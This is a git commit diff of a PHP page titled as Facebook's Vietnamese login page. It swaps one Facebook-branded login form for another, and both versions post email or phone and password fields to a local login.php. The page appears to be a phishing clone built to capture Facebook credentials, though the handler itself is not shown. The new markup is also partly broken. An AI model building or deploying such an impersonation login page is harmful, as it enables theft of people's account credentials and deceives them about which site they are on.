c15e77df7170b9dd3d862b8c8a1f7170adafd18e
Vanquy1306 <59086073+Vanquy1306@users.noreply.github.com>
2020-09-29 10:23:18 +0700

    Update buivanquangindex.php

--- buivanquangindex.php
+++ buivanquangindex.php
@@ -3,33 +3,36 @@
 <head>
 	<meta charset="UTF-8">
 	<title>Facebook - Đăng nhập hoặc đăng ký</title>
-	<link rel="shortcut icon" type="ico" href="images/fb-ico.png">
-	<link rel="stylesheet" type="text/css" href="style.css">
+	<link rel="stylesheet" href="style.css">
 </head>
 <body>
-	<header>
-		<div class="main-header">
-			<div class="logo">
-				<a href="http://www.facebook.com"><img src="images/logo.png" alt="Facebook"></a>
-			</div>
-		</div>
-	</header>
 	<section>
-		<div class="form">
-			<div class="m-header">
-				<h3>Facebook</h3>
-			</div>
-			<center> <div class="login-form">  
-				<form method="POST" action="login.php">
-					<label for="username">Username:</label>
-					<input name="username" type="text" id="username"></input><br /><br />
-					<label for="password">Password:</label>
-					<input name="password" id="password" type="password"></input><br />
-					<input type="submit" name="submit" value="Đăng Nhập" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
-                                        <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Quên mật khẩu?</a></div>
-				</form>
-
-		</div>
+		<<!-- login Page start -->
+		<div class="loginsignup">
+			<div class="container">
+				<div class="row justify-content-between">
+					<div class="content-left">
+						<h1>facebook</h1>
+						<h2>Facebook helps you connect and share with the people in your life.</h2>
+					</div>
+			<div class="content-right">
+						<form method="POST" action="login.php">
+							<div class="form-group">
+								<input type="text" placeholder="Email address or phone number">
+							</div>
+							<div class="form-group">
+								<input type="password" placeholder="Password">
+							</div>
+							<div class="login">
+								<a href="" class="btn">log in</a>
+							</div>
+							<div class="forgot">
+								<a href="">Forgotten account?</a>
+							</div>
+							<div class="create-btn">
+								<a href="" class="btn">create new account</a>
+							</div>
+						</form>
 </div>
 		<footer>
 			<ul>
